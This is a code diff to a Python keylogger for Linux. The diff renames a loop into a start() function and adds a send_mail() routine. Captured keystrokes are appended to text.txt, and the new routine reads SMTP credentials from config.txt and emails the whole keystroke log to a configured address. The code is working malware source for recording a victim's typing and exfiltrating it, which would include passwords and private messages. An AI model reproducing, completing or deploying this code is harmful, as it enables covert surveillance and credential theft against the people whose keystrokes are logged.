@@ -1,9 +1,9 @@
-__author__ = 'valentin'
-
 import ctypes as ct
 from ctypes.util import find_library
 import os
 import sys
+import smtplib
+from email.mime.text import MIMEText
 
 assert("linux" in sys.platform)
 
@@ -161,19 +161,44 @@ def fetch_keys():
 def write_file(kyes):
     st = os.getcwd()
     st +="/text.txt"
-    print st
 
     f = open(st,"a")
 
     try:
-        f.write(keys)
+        f.write(kyes)
     except:
-        print keys
+        a=0
 
     f.close()
 
-while 1:
-     changed, keys =  fetch_keys()
-     if changed:
-         write_file(keys)
+def start():
+    while 1:
+        changed, keys =  fetch_keys()
+        if changed:
+            write_file(keys)
 
+def send_mail():
+    #
+    f = open("config.txt","r")
+    fromaddr = f.readline().replace("\n","")
+    toaddr = f.readline().replace("\n","")
+    pas = f.readline().replace("\n","")
+    smtp_server = f.readline().replace("\n","")
+    port = int(f.readline().replace("\n",""))
+    f.close()
+    #
+    f = open("text.txt","r")
+    st =''
+    for i in f.readlines():
+        st += i
+    f.close()
+    #
+    msg = MIMEText(st,"","utf-8")
+    msg['Subject'] = 'Send File '
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    #
+    server = smtplib.SMTP_SSL(smtp_server,port)
+    server.login(fromaddr,pas)
+    server.sendmail(fromaddr,toaddr,msg.as_string())
+    server.quit()
